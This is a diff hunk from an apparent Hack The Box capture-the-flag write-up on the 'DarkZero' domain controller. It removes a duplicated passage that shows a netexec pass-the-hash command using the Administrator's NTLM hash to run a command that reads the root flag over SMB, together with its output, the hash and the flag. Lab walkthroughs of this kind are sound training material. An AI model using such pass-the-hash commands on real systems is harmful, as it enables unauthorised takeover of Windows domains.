@@ -540,12 +540,3 @@ SMB         10.129.13.92    445    DC01             [+] darkzero.htb\Administrat
 SMB         10.129.13.92    445    DC01             [+] Executed command via wmiexec
 SMB         10.129.13.92    445    DC01             70bba28ca33281cc5acba9a856ebd8a6
 ```
-```
-Using the `Administrator`'s hash, I executed a `Pass-the-Hash` attack to retrieve the root flag.
-```bash
-~/HTB/Windows/DarkZero $ nxc smb DC01 -u Administrator -H 5917507bdf2ef2c2b0a869a1cba40726 -x "type C:\Users\Administrator\Desktop\root.txt"
-SMB         10.129.13.92    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.129.13.92    445    DC01             [+] darkzero.htb\Administrator:5917507bdf2ef2c2b0a869a1cba40726 (Pwn3d!)
-SMB         10.129.13.92    445    DC01             [+] Executed command via wmiexec
-SMB         10.129.13.92    445    DC01             70bba28ca33281cc5acba9a856ebd8a6
-```
